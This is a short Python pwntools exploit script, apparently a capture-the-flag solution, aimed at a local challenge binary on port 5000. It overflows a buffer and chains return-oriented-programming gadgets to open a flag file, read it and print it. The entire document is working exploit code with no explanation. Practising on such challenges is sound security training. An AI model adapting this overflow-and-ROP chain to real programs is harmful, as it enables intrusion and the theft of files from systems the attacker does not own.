from pwn import *

# p = process("./chall")
p = remote("localhost", 5000)

payload = b"A"*0x18
payload += p64(0x40105d) # mov rax, 2
payload += p64(0x401079) # mov rdi, flag
payload += p64(0x401084) # mov esi, 0
payload += p64(0x40108a) # mov edx, 0
payload += p64(0x401090) # syscall

payload += p64(0x401093) # mov rdi, rax
payload += p64(0x401057) # mov rax, 0
payload += p64(0x401097) # mov rsi, 0x402028
payload += p64(0x401073) # mov rdx, 0x64
payload += p64(0x401090) # syscall

payload += p64(0x401051) # mov rax, 1
payload += p64(0x401097) # mov rsi,  0x402028
payload += p64(0x401073) # mov rdx, 0x64
payload += p64(0x401069) # mov edi, 0x1
payload += p64(0x401090) # syscall

# gdb.attach(p)
p.send(payload)

p.interactive()
